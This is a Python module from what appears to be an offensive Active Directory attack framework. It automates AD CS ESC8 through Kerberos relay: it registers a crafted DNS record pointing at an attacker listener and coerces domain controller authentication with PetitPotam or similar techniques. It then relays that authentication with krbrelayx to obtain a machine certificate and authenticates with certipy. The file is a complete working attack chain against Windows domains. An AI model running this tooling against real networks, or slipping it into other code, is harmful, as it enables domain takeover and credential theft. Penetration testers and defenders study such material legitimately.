import asyncio
import os
import shlex
import dns.resolver

from pathlib import Path
from module import BaseModule
from tool import Tool
from modules.coercion_petitpotam import PetitPotam
from modules.coercion_shadowcoerce import ShadowCoerce
from modules.coercion_printerbug import PrinterBug
from modules.coercion_dfscoerce import DfsCoerce

class ADCSESC8_KRB(BaseModule):
    name = "ADCS - ESC8"
    path = "adcs/esc8_krb"
    description = "ESC8: Kerberos Relay to AD CS Web Enrollment"

    info = """This module can be used instead of the NTLM Relay ESC8 when the CA and the DC are the same computer, and therefore NTLM relay can't be used.
    Prerequisites:
    - The AD CS HTTP Endpoint is enabled.
    - The endpoint is not configured to require SSL (though relaying to SSL endpoints is now also possible with certain techniques).
    - The attacker can coerce authentication from a target (e.g., via PetitPotam) and relay it to the web enrollment URL."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_netbios": {"default": "", "description": "NetBIOS name of the ADCS CA Server.", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "listen_ip": {"default": "", "description": "Listener (attacker) IP", "required": True},
        "template": {"default": "DomainController", "description": "ESC8 vulnerable template", "required": True},
        "coercer": {"default": "petitpotam", "description": "Coercion technique (petitpotam, printerbug, shadowcoerce, dfscoerce)", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)
        self.coercers = {"petitpotam": PetitPotam, "printerbug": PrinterBug, "shadowcoerce": ShadowCoerce, "dfscoerce": DfsCoerce}
        coercer, _ = self.get_option_value("coercer")
        self.set_option("coercer", coercer)

    def set_option(self, option_name: str, value: str, is_bool: bool=False) -> bool:
        if option_name == "coercer":
            if value.lower() not in self.coercers:
                value = "petitpotam" # default
            self.paired_module = self.coercers[value.lower()](self.registry, self.job_manager)

        if option_name in self.paired_module.options:
            self.paired_module.set_option(option_name, value, is_bool)

        return super().set_option(option_name, value, is_bool)

    def unset_option(self, option_name: str) -> bool:
        if option_name in self.paired_module.options:
            self.paired_module.unset_option(option_name)
        return super().unset_option(option_name)

    async def _run(self, dns_entry):
        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        tool.title("Register necessary DNS record")
        if not await tool.dnstool(['-r', dns_entry, '-d', self.opts.listen_ip, '--action', 'add', self.opts.dc_hostname, '--tcp']):
            return

        self.pane_b.write(f"\n[cyan]Step 2: Wait for DNS changes to be applied (by default this happens every 180s).[/cyan]")

        resolver = dns.resolver.Resolver()
        resolver.nameservers = [self.opts.dc_ip] # assume this

        while True:
            await asyncio.sleep(5)

            try:
                result = resolver.resolve(f"{dns_entry}.{self.opts.domain}", 'A')

                if len(result):
                    self.pane_b.write(f"{dns_entry} -> {result[0]}")
                    break

            except dns.resolver.NoAnswer:
                self.pane_b.write(f"{dns_entry} -> No answer.")
            except dns.resolver.NXDOMAIN:
                self.pane_b.write(f"{dns_entry} -> No such domain, waiting...")
            except dns.resolver.NoNameservers:
                self.pane_b.write(f"{dns_entry} -> SERVFAIL.")
            except dns.resolver.Timeout:
                self.pane_b.write(f"{dns_entry} -> Timeout.")
            except dns.exception.DNSException as err:
                self.pane_b.write(f"{dns_entry} -> Error: {err}")
        
        pfx = Path(f"{self.opts.ca_netbios.upper()}$.pfx")
        if pfx.exists():
            pfx.unlink()

        async def run_relay():
            return await tool.krbrelayx(['-t', f'http://{self.opts.ca_host}/certsrv/certfnsh.asp', '--adcs', '--template', self.opts.template, '-v', self.opts.ca_netbios.upper() + '$', '-ip', self.opts.listen_ip])

        await asyncio.gather(
            run_relay(),
            self.paired_module._run(dns_entry, self.opts.dc_hostname, sleep=1, pane=self.pane_c)
        )

        tool.title("Delete DNS record")
        if not await tool.dnstool(['-r', dns_entry, '-d', self.opts.listen_ip, '--action', 'remove', self.opts.dc_hostname, '--tcp']):
            return

        if not pfx.exists():
            self.pane_b.write("[red]Relay could not obtain certificate.[/red]")
            return

        tool.title("Authenticate as the target user")
        if not await tool.certipy_auth(str(pfx), ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")

    async def run(self):
        if not self.validate_options():
            return

        dns_entry = f"{self.opts.ca_netbios}1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"

        self.paired_module.pane_a = self.pane_a
        self.paired_module.pane_b = self.pane_b
        self.paired_module.pane_c = self.pane_c
        self.paired_module.opts.domain = self.opts.domain
        self.paired_module.opts.username = self.opts.username
        self.paired_module.opts.password = self.opts.password
        self.paired_module.opts.auth = self.opts.auth

        await self._run(dns_entry)
